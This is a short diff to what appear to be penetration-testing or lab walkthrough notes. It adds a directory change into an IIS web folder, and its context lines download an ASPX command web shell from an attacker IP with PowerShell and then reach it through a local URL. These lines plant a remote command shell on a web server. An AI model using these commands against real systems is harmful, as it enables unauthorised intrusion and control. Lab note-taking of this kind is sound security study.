@@ -216,6 +216,7 @@ whoami /all
 
 ```
 https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
+cd C:\inetpub\development
 powershell -c wget 10.10.14.10/cmd.aspx -outfile cmd.aspx
 http://127.0.0.1:8001/cmd.aspx
 ```
